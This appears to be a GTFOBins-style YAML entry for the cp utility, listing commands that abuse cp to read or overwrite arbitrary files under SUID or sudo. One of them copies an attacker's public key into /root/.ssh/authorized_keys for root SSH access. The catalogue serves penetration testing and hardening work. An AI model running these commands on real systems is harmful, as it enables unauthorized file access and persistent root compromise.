---
functions:
  file-read:
    - code: |
        LFILE=file_to_read
        cp "$LFILE" /dev/stdout
  file-write:
    - code: |
        LFILE=file_to_write
        echo "DATA" | cp /dev/stdin "$LFILE"
  suid:
    - code: |
        LFILE=file_to_write
        echo "DATA" | ./cp /dev/stdin "$LFILE"
    - description: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges.
      code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo "DATA" > $TF
        ./cp $TF $LFILE
    - description: This can be used to create directories and copy files into them, in this case copying a key into authorized_keys when the .ssh directory did not exist prior.
      code: |
        mkdir .ssh
        echo "<public_key_here>" > .ssh/authorized_keys
        cp --parents .ssh/authorized_keys /root
  sudo:
    - code: |
        LFILE=file_to_write
        echo "DATA" | sudo cp /dev/stdin "$LFILE"
    - description: This can be used to copy and then read or write files from a restricted file systems or with elevated privileges.
      code: |
        LFILE=file_to_write
        TF=$(mktemp)
        echo "DATA" > $TF
        sudo cp $TF $LFILE
---
